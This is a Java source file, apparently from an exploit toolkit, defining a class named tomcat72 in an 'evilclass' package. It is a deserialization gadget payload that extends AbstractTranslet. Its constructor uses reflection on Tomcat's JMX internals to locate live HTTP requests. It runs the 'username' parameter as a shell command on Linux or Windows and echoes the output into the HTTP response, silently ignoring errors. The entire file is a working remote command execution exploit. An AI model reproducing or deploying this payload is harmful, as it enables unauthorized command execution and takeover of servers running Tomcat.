package com.firebasky.echo.evilclass;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;
import org.apache.tomcat.util.buf.ByteChunk;
import org.apache.tomcat.util.modeler.Registry;

import javax.management.MBeanServer;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Scanner;

public class tomcat72 extends AbstractTranslet {
    public tomcat72(){
        try{

            MBeanServer mbeanServer = Registry.getRegistry((Object)null, (Object)null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
            field.setAccessible(true);
            HashMap obj2 = (HashMap)field.get(obj);
            obj = ((HashMap)obj2.get("Catalina")).get("name=\"http-bio-8888\",type=GlobalRequestProcessor");

            field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
            field.setAccessible(true);
            obj = field.get(obj);

            field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            field.setAccessible(true);
            ArrayList obj3 = (ArrayList)field.get(obj);

            field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
            field.setAccessible(true);

            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }

            for (int i = 0; i < obj3.size(); i++) {
                Request obj4 = (Request) field.get(obj3.get(i));
                String username = obj4.getParameters().getParameter("username");
                if(username != null){
                    String[] cmds = isLinux ? new String[]{"sh", "-c", username} : new String[]{"cmd.exe", "/c",  username};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\a");
                    String output = "";
                    while (s.hasNext()){
                        output += s.next();
                    }

                    byte[] buf = output.getBytes();
                    ByteChunk bc = new ByteChunk();
                    bc.setBytes(buf, 0, buf.length);
                    obj4.getResponse().doWrite(bc);
                    break;
                }
            }
        } catch (Exception e) {
//            System.out.println("=======================");
//            System.out.println(e);
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}